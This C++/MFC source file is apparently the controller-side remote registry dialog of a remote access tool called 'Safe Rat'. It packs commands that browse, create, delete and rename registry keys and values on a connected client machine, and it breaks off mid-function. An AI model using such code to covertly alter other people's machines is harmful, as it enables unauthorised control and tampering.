// CReg.cpp: 实现文件
//

#include "pch.h"
#include "Safe Rat.h"
#include "CReg.h"
#include "afxdialogex.h"
#include "CInputDlg.h"

#include"CRegText.h"
struct REGMSG
{
	int count;         //名字个数
	DWORD size;        //名字大小
	DWORD valsize;     //值大小	
};

enum KEYVALUE
{
	MREG_SZ,
	MREG_DWORD,
	MREG_QWORD,
	MREG_BINARY,
	MREG_EXPAND_SZ,
	MREG_MULTI_SZ
};
enum MYKEY
{
	MHKEY_CLASSES_ROOT,
	MHKEY_CURRENT_USER,
	MHKEY_LOCAL_MACHINE,
	MHKEY_USERS,
	MHKEY_CURRENT_CONFIG
};
static UINT indicators[] =
{
	ID_SEPARATOR
};
// CReg 对话框

IMPLEMENT_DYNAMIC(CReg, CDialogEx)

CReg::CReg(CWnd* pParent, CHpTcpServer* pIOCPServer, ClientContext *pContext)
	: CDialogEx(IDD_REG_DLG, pParent)
{

	m_hIcon = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_ICON_REG));;
	m_bOnClose  = FALSE;					
	m_iocpServer = pIOCPServer;
	m_pContext = pContext;
	isEnable = true;
	isEdit = false;
	how = 0;
}

CReg::~CReg()
{
	DestroyIcon(m_hIcon);
}

void CReg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_TREE_REG, m_Tree);
	DDX_Control(pDX, IDC_LIST_REG, m_list);
}


BEGIN_MESSAGE_MAP(CReg, CDialogEx)
	ON_WM_CLOSE()
	ON_WM_SIZE()

	ON_NOTIFY(TVN_SELCHANGED, IDC_TREE_REG, &CReg::OnTvnSelchangedTreeReg)
	ON_NOTIFY(NM_RCLICK, IDC_TREE_REG, &CReg::OnNMRClickTreeReg)
	ON_NOTIFY(TVN_BEGINLABELEDIT, IDC_TREE_REG, &CReg::OnTvnBeginlabeleditTreeReg)
	ON_NOTIFY(TVN_ENDLABELEDIT, IDC_TREE_REG, &CReg::OnTvnEndlabeleditTreeReg)
	ON_NOTIFY(NM_RCLICK, IDC_LIST_REG, &CReg::OnNMRClickListReg)
	ON_NOTIFY(NM_DBLCLK, IDC_LIST_REG, &CReg::OnNMDblclkListReg)
END_MESSAGE_MAP()


// CReg 消息处理程序
void CReg::OnReceiveComplete()
{
	if (m_bOnClose) 	return;


	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
		case TOKEN_REG_PATH:            //接收项
			AddToTree((char*)(m_pContext->m_DeCompressionBuffer.GetBuffer(1)));
			break;
		case TOKEN_REG_KEY:             //接收键, 值
			AddToList((char*)(m_pContext->m_DeCompressionBuffer.GetBuffer(1)));
			break;
		case TOKEN_REG_OK:
			OK();
			isEdit = false;
			break;
		default:
			isEdit = false;
			break;
	}

	//有返回就取消禁用状态
	EnableCursor(true);

}
void CReg::OK()
{
	//执行了什么操作    1，删除项  2，新建项   3，删除键  4， 新建键  5，编辑键  
	if (how == 1)
	{
		while (m_Tree.GetChildItem(SelectNode) != NULL)
		{
			m_Tree.DeleteItem(m_Tree.GetChildItem(SelectNode));        //删除 会产生 OnSelchangingTree事件 ***
		}
		m_Tree.DeleteItem(SelectNode);
		how = 0;
	}
	else if (how == 2)
	{
		m_Tree.InsertItem(Path, 1, 1, SelectNode, 0);//插入子键名称
		m_Tree.Expand(SelectNode, TVE_EXPAND);
		Path = "";
	}
	else if (how == 3)
	{
		if (index != 0)
			m_list.DeleteItem(index);
		else
		{
			m_list.SetItemText(index, 1, "REG_SZ");
			m_list.SetItemText(index, 2, "(数值未设置)");
			m_list.SetItemData(index, FALSE);
		}
		index = 0;
	}
	else if (how == 4)
	{
		int nitem;
		char dwValueDate[256];
		DWORD dwValueTemp = 0;
		QWORD dd;
		switch (this->type)
		{
		case MREG_SZ:     //加了字串
			nitem = m_list.InsertItem(m_list.GetItemCount(), Key, 0);
			m_list.SetItemText(nitem, 1, "REG_SZ");
			m_list.SetItemText(nitem, 2, Value);
			m_list.SetItemData(nitem, TRUE);
			break;
		case MREG_DWORD:  //加了DWORD
			dwValueTemp = atoi(Value.GetBuffer(0));
			sprintf(dwValueDate, "0x%08x(%u)", dwValueTemp, dwValueTemp);
			nitem = m_list.InsertItem(m_list.GetItemCount(), Key, 1);
			m_list.SetItemText(nitem, 1, "REG_DWORD");
			m_list.SetItemText(nitem, 2, dwValueDate);
			m_list.SetItemData(nitem, TRUE);
			break;
		case MREG_EXPAND_SZ:
			nitem = m_list.InsertItem(m_list.GetItemCount(), Key, 0);
			m_list.SetItemText(nitem, 1, "REG_EXPAND_SZ");
			m_list.SetItemText(nitem, 2, Value);
			m_list.SetItemData(nitem, TRUE);
			break;
		case MREG_QWORD:  //改了QWORD
			dd = _atoi64(Value.GetBuffer(0));
			sprintf(dwValueDate, "0x%llx(%llu)", dd, dd);
			nitem = m_list.InsertItem(m_list.GetItemCount(), Key, 1);
			m_list.SetItemText(nitem, 1, "REG_QWORD");
			m_list.SetItemText(nitem, 2, dwValueDate);
			m_list.SetItemData(nitem, TRUE);
			break;
		default:
			break;
		}
	}
	else if (how == 5)
	{
	
		char dwValueDate[256];
		DWORD dwValueTemp = 0;
		DWORD64 dd;
		switch (type)
		{
		case MREG_SZ:     //改了字串
			m_list.SetItemText(index, 2, Value);
			m_list.SetItemData(index, TRUE);
			break;
		case MREG_DWORD:  //改了DWORD
			dwValueTemp = atod(Value.GetBuffer(0));
			sprintf(dwValueDate, "0x%08x(%u)", dwValueTemp, dwValueTemp);
			m_list.SetItemText(index, 2, dwValueDate);
			m_list.SetItemData(index, TRUE);
			break;
		case MREG_QWORD:  //改了QWORD
			dd = _atoi64(Value.GetBuffer(0));
			sprintf(dwValueDate, "0x%llx(%llu)", dd, dd);
			m_list.SetItemText(index, 2, dwValueDate);
			m_list.SetItemData(index, TRUE);
			break;
		case MREG_EXPAND_SZ:
			m_list.SetItemText(index, 2, Value);
			m_list.SetItemData(index, TRUE);
			break;
		default:
			break;
		}
	}

	how = 0;

}
DWORD CReg::atod(char* ch)
{
	int len = strlen(ch);
	DWORD d = 0;
	for (int i = 0; i < len; i++)
	{
		int t = ch[i] - 48;   //这位上的数字
		if (ch[i] > 57 || ch[i] < 48) //不是数字
		{
			return d;
		}
		d *= 10;
		d += t;
	}
	return d;
}

void CReg::AddToTree(char* lpBuffer)
{
	if (lpBuffer == NULL)
		return;
	int msgsize = sizeof(REGMSG);
	REGMSG msg;
	memcpy((void*)&msg, lpBuffer, msgsize);
	DWORD size = msg.size;
	int count = msg.count;

	if (size > 0 && count > 0)
	{
		for (int i = 0; i < count; i++)
		{
			char* szKeyName = lpBuffer + size * i + msgsize;
			m_Tree.InsertItem(szKeyName, 1, 1, SelectNode, 0);	//插入子键名称
			m_Tree.Expand(SelectNode,TVE_EXPAND); //去掉不展开树
		}
	}
}

void CReg::AddToList(char* lpBuffer)
{
	m_list.DeleteAllItems();

	if (lpBuffer == NULL)
		return;

	//插入默认
	int nitem = m_list.InsertItem(0, "(默认)", 0);
	m_list.SetItemText(nitem, 1, "REG_SZ");
	m_list.SetItemText(nitem, 2, "(数值未设置)");
	m_list.SetItemData(nitem, FALSE);

	REGMSG msg;
	memcpy((void*)&msg, lpBuffer, sizeof(msg));
	char* tmp = lpBuffer + sizeof(msg);
	for (int i = 0; i < msg.count; i++)
	{
		BYTE Type = tmp[0];   //取出标志头
		tmp += sizeof(BYTE);
		TCHAR* szValueName = (TCHAR*)tmp;   //取出名字
		tmp += msg.size;
		BYTE* szValueDate = (BYTE*)tmp;      //取出值
		tmp += msg.valsize;
		if (Type == MREG_SZ)
		{
			if (strlen(szValueName) == 0)
			{
				m_list.SetItemText(0, 2, (char*)szValueDate);
				m_list.SetItemData(0, TRUE);
			}
			else
			{
				int nitem = m_list.InsertItem(m_list.GetItemCount(), szValueName, 0);
				m_list.SetItemText(nitem, 1, "REG_SZ");
				m_list.SetItemText(nitem, 2, (char*)szValueDate);
				m_list.SetItemData(nitem, TRUE);
			}
		}
		else if (Type == MREG_DWORD)
		{
			char dwValueDate[256];
			DWORD dwValueTemp = 0;
			memcpy(&dwValueTemp, szValueDate, sizeof(DWORD));
			sprintf(dwValueDate, "0x%08x(%u)", dwValueTemp, dwValueTemp);
			if (strlen(szValueName) == 0)
			{
				m_list.SetItemText(0, 2, dwValueDate);
				m_list.SetItemData(0, TRUE);
			}
			else
			{
				int nitem = m_list.InsertItem(m_list.GetItemCount(), szValueName, 1);
				m_list.SetItemText(nitem, 1, "REG_DWORD");
				m_list.SetItemText(nitem, 2, dwValueDate);
				m_list.SetItemData(nitem, TRUE);
			}
		}
		else if (Type == MREG_QWORD)
		{
			char qwValueDate[256];
			unsigned __int64 qwValueTemp;
			memcpy(&qwValueTemp, szValueDate, sizeof(unsigned __int64));
			sprintf(qwValueDate, qwValueTemp <= 0xffffffff ? "0x%08I64x(%I64u)" : "0x%I64x(%I64u)", qwValueTemp, qwValueTemp);
			if (strlen(szValueName) == 0)
			{
				m_list.SetItemText(0, 2, qwValueDate);
				m_list.SetItemData(0, TRUE);
			}
			else
			{
				int nitem = m_list.InsertItem(m_list.GetItemCount(), szValueName, 1);
				m_list.SetItemText(nitem, 1, "REG_QWORD");
				m_list.SetItemText(nitem, 2, qwValueDate);
				m_list.SetItemData(nitem, TRUE);
			}
		}
		else if (Type == MREG_BINARY)
		{
			int nValueLength = strlen((const char*)szValueDate);
			char* biValueDate = new char[nValueLength * 3];
			char* pTmpChar = (char*)szValueDate;
			char* pOutChar = biValueDate;
			for (size_t i = 0; i < nValueLength; i++)
			{
				if (i == nValueLength - 1)
				{
					sprintf(pOutChar, "%02x", (unsigned char)*pTmpChar++);
					pOutChar += 2;
				}
				else
				{
					sprintf(pOutChar, "%02x ", (unsigned char)*pTmpChar++);
					pOutChar += 3;
				}
			}
			if (strlen(szValueName) == 0)
			{
				m_list.SetItemText(0, 2, biValueDate);
				m_list.SetItemData(0, TRUE);
			}
			else
			{
				int nitem = m_list.InsertItem(m_list.GetItemCount(), szValueName, 1);
				m_list.SetItemText(nitem, 1, "REG_BINARY");
				m_list.SetItemText(nitem, 2, biValueDate);
				m_list.SetItemData(nitem, TRUE);
			}
			delete[] biValueDate;
		}
		else if (Type == MREG_EXPAND_SZ)
		{
			if (strlen(szValueName) == 0)
			{
				m_list.SetItemText(0, 2, (char*)szValueDate);
				m_list.SetItemData(0, TRUE);
			}
			else
			{
				int nitem = m_list.InsertItem(m_list.GetItemCount(), szValueName, 0);
				m_list.SetItemText(nitem, 1, "REG_EXPAND_SZ");
				m_list.SetItemText(nitem, 2, (char*)szValueDate);
				m_list.SetItemData(nitem, TRUE);
			}
		}
		else if (Type == MREG_MULTI_SZ)
		{
			CString strValueDate((LPCSTR)szValueDate, msg.valsize);
			char* pValueTemp = strValueDate.GetBuffer(0);
			for (DWORD i = 0; i < msg.valsize; i++)
			{
				if (*(WORD*)pValueTemp == 0)
					break;
				else if (*pValueTemp == '\0')
					*pValueTemp = ' ';
				pValueTemp++;
			}
			strValueDate.ReleaseBuffer();
			if (strlen(szValueName) == 0)
			{
				m_list.SetItemText(0, 2, strValueDate);
				m_list.SetItemData(0, TRUE);
			}
			else
			{
				int nitem = m_list.InsertItem(m_list.GetItemCount(), szValueName, 0);
				m_list.SetItemText(nitem, 1, "REG_MULTI_SZ");
				m_list.SetItemText(nitem, 2, strValueDate);
				m_list.SetItemData(nitem, TRUE);
			}
		}
		else continue;
	}

}

void CReg::PostNcDestroy()
{
	if (!m_bOnClose)
		OnClose();

	CDialogEx::PostNcDestroy();
	delete this;
}

void CReg::OnClose()
{
	m_iocpServer->Disconnect(m_pContext);
	m_bOnClose = TRUE;
	CDialogEx::OnClose();
}

void CReg::OnSize(UINT nType, int cx, int cy)
{
	CDialogEx::OnSize(nType, cx, cy);
	// TODO: Add your message handler code here
	if (m_list.m_hWnd == NULL)return;
	if (m_Tree.m_hWnd == NULL)return;


	CRect rect;
	m_Tree.GetWindowRect(&rect);

	CRect treeRec, listRec;
	treeRec.top = treeRec.left = 0;
	treeRec.right = rect.Width();
	treeRec.bottom = cy - 20;
	m_Tree.MoveWindow(treeRec);

	listRec.top = 0;
	listRec.left = treeRec.right + 3;
	listRec.right = cx;
	listRec.bottom = cy - 20;
	m_list.MoveWindow(listRec);

	if (m_wndStatusBar.m_hWnd != NULL)
	{
		CRect rc;
		rc.top = cy - 20;
		rc.left = 0;
		rc.right = cx;
		rc.bottom = cy;
		m_wndStatusBar.MoveWindow(rc);
	}

}

BOOL CReg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon

	//设置标题
	CString str;
	str.Format("%s - Remote Reg", m_pContext->m_RemoteIP);
	SetWindowText(str);

	// 创建状态栏
	if (!m_wndStatusBar.Create(this) ||
		!m_wndStatusBar.SetIndicators(indicators,
			sizeof(indicators) / sizeof(UINT)))
	{
		TRACE0("Failed to create status bar\n");
		return FALSE;      // fail to create
	}

	//显示状态栏		
	m_wndStatusBar.SetPaneInfo(0, m_wndStatusBar.GetItemID(0), SBPS_STRETCH, NULL);
	RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, 0); 
	m_wndStatusBar.SetPaneText(0, "计算机");

	// 设置列表风格
	m_list.SetExtendedStyle(LVS_EX_FULLROWSELECT);
	
	HICON listicon[2];
	listicon[0] = AfxGetApp()->LoadIcon(IDI_ICON_REG_STR);
	listicon[1] = AfxGetApp()->LoadIcon(IDI_ICON_REG_NUM);
	//创建
	m_ImageList.Create(16, 16, ILC_COLOR32 | ILC_MASK, 2, 2); 
	for (int i = 0; i < 2; ++i)
	{
		m_ImageList.Add(listicon[i]); //读入图标
		DestroyIcon(listicon[i]);
	}
	//跟图标关联	
	m_list.SetImageList(&m_ImageList, LVSIL_SMALL);

	m_list.InsertColumn(0, TEXT("名称"), LVCFMT_LEFT, 180);
	m_list.InsertColumn(1, TEXT("类型"), LVCFMT_LEFT, 150);
	m_list.InsertColumn(2, TEXT("数据"), LVCFMT_LEFT, 310);

	// 树形图标设置
	HICON treeicon[2];
	treeicon[0] = AfxGetApp()->LoadIcon(IDI_ICON_MAIN);	//计算机图标
	treeicon[1] = AfxGetApp()->LoadIcon(IDI_ICON_EXP);	//文件夹图标

	m_ImageTree.Create(16, 16, ILC_COLOR32| ILC_MASK, 2, 2);
	for (int n = 0; n < 2; ++n)
	{
		m_ImageTree.Add(treeicon[n]);
		DestroyIcon(treeicon[n]);
	}		
	m_Tree.SetImageList(&m_ImageTree, TVSIL_NORMAL);

	//设置树形控件风格
	DWORD	dwStyle = GetWindowLong(m_Tree.m_hWnd, GWL_STYLE);
	dwStyle |= TVS_HASBUTTONS | TVS_HASLINES | TVS_LINESATROOT;
	SetWindowLong(m_Tree.m_hWnd, GWL_STYLE, dwStyle);

	m_hRoot = m_Tree.InsertItem("计算机", 0, 0);

	//默认第一个图标选中时还是第一个图标
	HKCR = m_Tree.InsertItem(_T("HKEY_CLASSES_ROOT"),1, 1, m_hRoot);
	HKCU = m_Tree.InsertItem(_T("HKEY_CURRENT_USER"), 1, 1, m_hRoot);
	HKLM = m_Tree.InsertItem(_T("HKEY_LOCAL_MACHINE"), 1, 1, m_hRoot);
	HKUS = m_Tree.InsertItem(_T("HKEY_USERS"), 1, 1, m_hRoot);
	HKCC = m_Tree.InsertItem(_T("HKEY_CURRENT_CONFIG"),1, 1, m_hRoot);

	m_Tree.Expand(m_hRoot, TVE_EXPAND);


	HWND hWndHeader = m_list.GetDlgItem(0)->GetSafeHwnd();
	m_heades.SubclassWindow(hWndHeader);
	m_heades.SetTheme(new CXTHeaderCtrlThemeOffice2003());
	m_heades.EnablePopupMenus(FALSE);
	EnableControls(FALSE);
	ModifyDrawStyle(XTTHEME_WINXPTHEMES, 4);
	ModifyDrawStyle(HDR_XTP_HOTTRACKING, TRUE);
	ModifyDrawStyle(XTTHEME_HOTTRACKING, TRUE);


	HTREEITEM hRootItem = (HTREEITEM)m_Tree.SendMessage(TVM_GETNEXTITEM, TVGN_ROOT, NULL);
	HTREEITEM	hChildItem = (HTREEITEM)m_Tree.SendMessage(TVM_GETNEXTITEM, TVGN_CHILD, (LPARAM)hRootItem);
	m_Tree.SendMessage(TVM_EXPAND, TVE_EXPAND, (LPARAM)hRootItem);
	m_Tree.SendMessage(TVM_GETNEXTITEM, TVGN_NEXT, (LPARAM)hRootItem);

	return TRUE;  // return TRUE unless you set the focus to a control
				  // 异常: OCX 属性页应返回 FALSE
}

void CReg::EnableControls(BOOL bRedraw)
{
	XTOSVersionInfo()->IsWinXPOrGreater();
	XTOSVersionInfo()->IsWinXPOrGreater();

	if (bRedraw)
	{
		RedrawWindow(NULL, NULL, RDW_INVALIDATE | RDW_UPDATENOW | RDW_ERASE | RDW_ALLCHILDREN);
	}
}

void CReg::ModifyDrawStyle(UINT uFlag, BOOL bRemove)
{
	CXTHeaderCtrlTheme* pTheme = m_heades.GetTheme();
	if (pTheme)
	{
		DWORD dwStyle = pTheme->GetDrawStyle() & ~uFlag;

		if (bRemove)
			dwStyle |= uFlag;

		pTheme->SetDrawStyle(dwStyle, &m_heades);
		m_heades.RedrawWindow();
	}
}

void CReg::EnableCursor(bool bEnable)
{
	if (bEnable)
	{
		isEnable = true;
		::SetCursor(::LoadCursor(NULL, IDC_ARROW));
	}
	else
	{
		isEnable = false;
		::SetCursor(LoadCursor(NULL, IDC_WAIT));
	}
}

char CReg::getFatherPath(CString& FullPath)
{
	char bToken;
	if (!FullPath.Find("HKEY_CLASSES_ROOT"))	//判断主键
	{

		bToken = MHKEY_CLASSES_ROOT;
		FullPath.Delete(0, sizeof("HKEY_CLASSES_ROOT"));
	}
	else if (!FullPath.Find("HKEY_CURRENT_USER"))
	{
		bToken = MHKEY_CURRENT_USER;
		FullPath.Delete(0, sizeof("HKEY_CURRENT_USER"));

	}
	else if (!FullPath.Find("HKEY_LOCAL_MACHINE"))
	{
		bToken = MHKEY_LOCAL_MACHINE;
		FullPath.Delete(0, sizeof("HKEY_LOCAL_MACHINE"));

	}
	else if (!FullPath.Find("HKEY_USERS"))
	{
		bToken = MHKEY_USERS;
		FullPath.Delete(0, sizeof("HKEY_USERS"));

	}
	else if (!FullPath.Find("HKEY_CURRENT_CONFIG"))
	{
		bToken = MHKEY_CURRENT_CONFIG;
		FullPath.Delete(0, sizeof("HKEY_CURRENT_CONFIG"));

	}
	return bToken;
}
CString CReg::GetFullPath(HTREEITEM hCurrent)
{
	CString strTemp;
	CString strReturn = "";
	while (1)
	{
		if (hCurrent == m_hRoot) return strReturn;
		strTemp = m_Tree.GetItemText(hCurrent);   //得到当前的
		if (strTemp.Right(1) != "\\")
			strTemp += "\\";
		strReturn = strTemp + strReturn;
		hCurrent = m_Tree.GetParentItem(hCurrent);   //得到父的

	}
	return strReturn;
}

//点击项
void CReg::OnTvnSelchangedTreeReg(NMHDR *pNMHDR, LRESULT *pResult)
{
	NM_TREEVIEW* pNMTreeView = (NM_TREEVIEW*)pNMHDR;
	// TODO: Add your control notification handler code here
	if (!isEnable) return;
	TVITEM item = pNMTreeView->itemNew;

	if (item.hItem == m_hRoot)
	{
		m_list.DeleteAllItems();
		return;
	}
	SelectNode = item.hItem;			//保存用户打开的子树节点句柄

	m_list.DeleteAllItems();

	CString FullPath = GetFullPath(SelectNode);
	m_wndStatusBar.SetPaneText(0, FullPath);
	HTREEITEM CurrentNode = item.hItem; //取得此节点的全路径

	while (m_Tree.GetChildItem(CurrentNode) != NULL)
	{
		m_Tree.DeleteItem(m_Tree.GetChildItem(CurrentNode));        //删除 会产生 OnSelchangingTree事件 ***
	}

	char bToken = getFatherPath(FullPath);
	//愈加一个键
	int nitem = m_list.InsertItem(0, "(默认)", 0);
	m_list.SetItemText(nitem, 1, "REG_SZ");
	m_list.SetItemText(nitem, 2, "(数值未设置)");
	m_list.SetItemData(nitem, FALSE);
	FullPath.Insert(0, bToken);      //插入那个根键
	bToken = COMMAND_REG_FIND;
	FullPath.Insert(0, bToken);      //插入查询命令
	EnableCursor(false);
	m_iocpServer->Send(m_pContext, (LPBYTE)(FullPath.GetBuffer(0)), FullPath.GetLength() + 1);
	*pResult = 0;
}

//树形结构上右键
void CReg::OnNMRClickTreeReg(NMHDR *pNMHDR, LRESULT *pResult)
{
	if (!isEnable)	return;

	//创建菜单
	m_treeMenu.Detach();
	m_treeMenu.DestroyMenu();
	m_treeMenu.CreatePopupMenu();
	m_treeMenu.AppendMenu(MF_STRING | MF_ENABLED, 100, _T("新建(&N)"));
	m_treeMenu.AppendMenu(MF_STRING | MF_ENABLED, 200, _T("删除(&D)"));
	m_treeMenu.AppendMenu(MF_STRING | MF_ENABLED, 300, _T("重命名(&M)"));
	m_treeMenu.AppendMenu(MF_SEPARATOR, NULL);
	m_treeMenu.AppendMenu(MF_STRING | MF_ENABLED, 400, _T("复制项名称(&C)"));

	POINT mousepoint;
	GetCursorPos(&mousepoint);
	BOOL M_MiNiid = m_treeMenu.TrackPopupMenu(TPM_LEFTALIGN | TPM_RIGHTBUTTON | TPM_RETURNCMD, mousepoint.x, mousepoint.y, this);
	if (!M_MiNiid) 	return;
	
	switch (M_MiNiid)
	{
		case 100: //新建	
			OnMenuitemTreeNew();
			break;
		case 200: //删除
			OnMenuitemTreeDel();
			break;
		case 300: //重命名
		{
			m_Tree.ModifyStyle(NULL, TVS_EDITLABELS); //设置编辑风格
			g_sSelectStr = m_Tree.GetItemText(m_Tree.GetSelectedItem());
			m_Tree.EditLabel(m_Tree.GetSelectedItem());
			break;
		}
		case 400://复制
			OnMenuitemTreeCopyname();
			break;

	}
		

	*pResult = 0;
}

void CReg::OnMenuitemTreeCopyname()
{
	if (SelectNode != 0)
	{
		CString FullPath = GetFullPath(SelectNode);      //得到全路径
		SetClipboardText(FullPath);
	}

	return;
}

void CReg::SetClipboardText(CString szStr)
{
	if (::OpenClipboard(NULL))
	{
		if (EmptyClipboard())
		{
			size_t cbStr = (szStr.GetLength() + 1) * sizeof(TCHAR);
			HGLOBAL hData = GlobalAlloc(GMEM_MOVEABLE, cbStr);
			memcpy_s(GlobalLock(hData), cbStr, szStr.LockBuffer(), cbStr);
			szStr.UnlockBuffer();
			GlobalUnlock(hData);
			UINT nFormat = (sizeof(TCHAR) == sizeof(WCHAR) ? CF_UNICODETEXT : CF_TEXT);
			if (NULL == ::SetClipboardData(nFormat, hData))
			{
				CloseClipboard();
				return;
			}
		}
		CloseClipboard();        //关闭剪切板
	}
}
//删除项
void CReg::OnMenuitemTreeDel()
{
	// TODO: Add your command handler code here
	CString FullPath = GetFullPath(SelectNode);      //得到全路径

	if (MessageBox(_T("确定删除  ") + FullPath + _T("项吗"), _T("提示"), MB_YESNO | MB_ICONQUESTION) == IDNO)
		return;

	BYTE bToken = getFatherPath(FullPath);

	FullPath.Insert(0, bToken);//插入  那个根键
	bToken = COMMAND_REG_DELPATH;
	FullPath.Insert(0, bToken);    
	how = 1;
	EnableCursor(false);
	m_iocpServer->Send(m_pContext, (LPBYTE)(FullPath.GetBuffer(0)), (FullPath.GetLength() + 1) * sizeof(TCHAR));
}
//新建项
void CReg::OnMenuitemTreeNew()
{
	if (SelectNode == 0)return;
	
	// TODO: Add your command handler code here
	CInputDlg	dlg(this);
	dlg.Init(_T("新建项"), _T("请输入要创建的项名称:"));
	if (dlg.DoModal() != IDOK)
		return;


	//得到全路径
	CString FullPath = GetFullPath(SelectNode);      //得到全路径
	FullPath += dlg.m_putdata;
	//获取token
	BYTE bToken = getFatherPath(FullPath);

	FullPath.Insert(0, bToken);//插入  那个根键
	bToken = COMMAND_REG_CREATEPATH;
	FullPath.Insert(0, bToken);      //插入查询命令

	how = 2;

	Path = dlg.m_putdata;

	EnableCursor(false);

	m_iocpServer->Send(m_pContext, (LPBYTE)(FullPath.GetBuffer(0)), (FullPath.GetLength() + 1));
	
}

//开始编辑项
void CReg::OnTvnBeginlabeleditTreeReg(NMHDR *pNMHDR, LRESULT *pResult)
{
	TV_DISPINFO* pTVDispInfo = (TV_DISPINFO*)pNMHDR;
	m_Tree.GetEditControl()->LimitText(1024);
	*pResult = 0;
}

//防止修改的数据有相同 嵌套循环
HTREEITEM CReg::FindItem(HTREEITEM item, CString strText)
{
	HTREEITEM hFind;
	if (item == NULL)
	{
		return NULL;
	}
	while (item != NULL)
	{
		if (m_Tree.GetItemText(item) == strText)
		{
			return item;
		}
		if (m_Tree.ItemHasChildren(item))
		{
			item = m_Tree.GetChildItem(item);
			hFind = FindItem(item, strText);
			if (hFind)
			{
				return hFind;
			}
			else
			{
				item = m_Tree.GetNextSiblingItem(m_Tree.GetParentItem(item));
			}
		}
		else
		{
			item = m_Tree.GetNextSiblingItem(item);
			if (item == NULL)
			{
				return NULL;
			}
		}
	}
	return item;
}

//完成编辑项
void CReg::OnTvnEndlabeleditTreeReg(NMHDR *pNMHDR, LRESULT *pResult)
{
	TV_DISPINFO* pTVDispInfo = (TV_DISPINFO*)pNMHDR;

	CString strName;		//修改后的数据
	m_Tree.GetEditControl()->GetWindowText(strName);

	if (strName.IsEmpty())
	{
		MessageBox(_T("数据项名称不能为空，请重新输入!"));
		return;
	}
	//跟之前项目一样就退出
	if (strName == g_sSelectStr)
	{
		return;
	}
	HTREEITEM hRoot = m_Tree.GetRootItem();
	HTREEITEM hFind = FindItem(hRoot, strName);		//判断数据是否相同
	if (hFind == NULL)
	{
		TCHAR msg[MAX_PATH] = { 0 };
		wsprintf(msg, _T("修改信息为 %s, 确定吗 ? "), strName);
		if (MessageBox(msg, _T("提示"), MB_OKCANCEL) == IDOK)
		{
			CString FullPath = GetFullPath(SelectNode);      //得到全路径

			BYTE bToken = getFatherPath(FullPath);

			int oldsize = (FullPath.GetLength() + 1) * sizeof(TCHAR);
			int newsize = (strName.GetLength() + 1) * sizeof(TCHAR);
			int sendsize = 1 + 1 + sizeof(int) * 2 + oldsize + newsize;
			char* sendate = new char[sendsize];
			sendate[0] = COMMAND_REG_RENAME;
			sendate[1] = bToken;
			memcpy(sendate + 2, &oldsize, sizeof(int));
			memcpy(sendate + 2 + sizeof(int), &newsize, sizeof(int));
			memcpy(sendate + 2 + sizeof(int) * 2, FullPath.GetBuffer(0), oldsize);
			memcpy(sendate + 2 + sizeof(int) * 2 + oldsize, strName.GetBuffer(0), newsize);

			EnableCursor(false);

			m_iocpServer->Send(m_pContext, (LPBYTE)sendate, sendsize);
			SAFE_DELETE_AR(sendate);
			*pResult = TRUE;

		}
		else
		{
			return;
		}
	}
	else //找到相同数据  
	{
		MessageBox(_T("该数据已存在"));
	}
	*pResult = 0;
}

BYTE CReg::GetEditType(int index)
{
	if (index < 0) return 100;
	CString strType = m_list.GetItemText(index, 1);      //得到类型
	if (strType == "REG_SZ")
		return  MREG_SZ;
	else if (strType == "REG_DWORD")
		return MREG_DWORD;
	else if (strType == "REG_EXPAND_SZ")
		return MREG_EXPAND_SZ;
	else
		return 100;
}

//列表右键
void CReg::OnNMRClickListReg(NMHDR *pNMHDR, LRESULT *pResult)
{
	if (!isEnable) return;
	if (SelectNode == m_hRoot || SelectNode == 0) return;

	m_listMenu.Detach();
	m_listMenu.DestroyMenu();
	m_listMenu.CreatePopupMenu();
	m_listMenu.AppendMenu(MF_STRING | MF_ENABLED, 100, _T("编辑(&E)"));
	m_listMenu.AppendMenu(MF_STRING | MF_ENABLED, 200, _T("删除(&D)"));
	//添加二级菜单
	CMenu MiNimenu_new;
	MiNimenu_new.CreatePopupMenu();
	m_listMenu.InsertMenu(25, MF_BYPOSITION | MF_POPUP | MF_STRING, (UINT)MiNimenu_new.m_hMenu, _T("新建(&N)"));
	MiNimenu_new.AppendMenu(MF_STRING | MF_ENABLED, 300, _T("字符串值(&Z)"));
	MiNimenu_new.AppendMenu(MF_STRING | MF_ENABLED, 400, _T("DWORD 值(&D)"));
	MiNimenu_new.AppendMenu(MF_STRING | MF_ENABLED, 500, _T("可扩字符串(&E)"));

	if (m_list.GetSelectedCount() == 0)             //没有选中
	{
		m_listMenu.EnableMenuItem(0, MF_BYPOSITION | MF_GRAYED);     //编辑
		m_listMenu.EnableMenuItem(1, MF_BYPOSITION | MF_GRAYED);     //删除
	}
	else {
		if (GetEditType(m_list.GetSelectionMark()) == 100)
			m_listMenu.EnableMenuItem(0, MF_BYPOSITION | MF_GRAYED);     //编辑
		m_listMenu.EnableMenuItem(2, MF_BYPOSITION | MF_GRAYED);         //新建
	}

	POINT mousepoint;
	GetCursorPos(&mousepoint);
	BOOL M_MiNiid = m_listMenu.TrackPopupMenu(TPM_LEFTALIGN | TPM_RIGHTBUTTON | TPM_RETURNCMD, mousepoint.x, mousepoint.y, this);
	if (!M_MiNiid) 	return;

	switch (M_MiNiid)
	{
	case 100: OnMenuitemRegEdit(); break;
	case 200: OnMenuitemRegDel(); break;
	case 300: OnMenuitemRegStr(); break;
	case 400: OnMenuitemRegDword(); break;
	case 500: OnMenuitemExstr(); break;
	default:
		break;
	}

	*pResult = 0;
}
void CReg::OnMenuitemRegDel()
{
	// TODO: Add your command handler code here
	REGMSG msg;

	int index = m_list.GetSelectionMark();

	CString FullPath = GetFullPath(SelectNode);      //得到全路径
	char bToken = getFatherPath(FullPath);

	CString key = m_list.GetItemText(index, 0);      //得到键名

	msg.size = FullPath.GetLength() * sizeof(TCHAR);              //  项名大小
	msg.valsize = key.GetLength() * sizeof(TCHAR);               //键名大小

	int datasize = sizeof(msg) + msg.size + msg.valsize + 4;
	char* buf = new char[datasize];
	ZeroMemory(buf, datasize);

	buf[0] = COMMAND_REG_DELKEY;     //命令头
	buf[1] = bToken;              //主键
	memcpy(buf + 2, (void*)&msg, sizeof(msg));                     //数据头
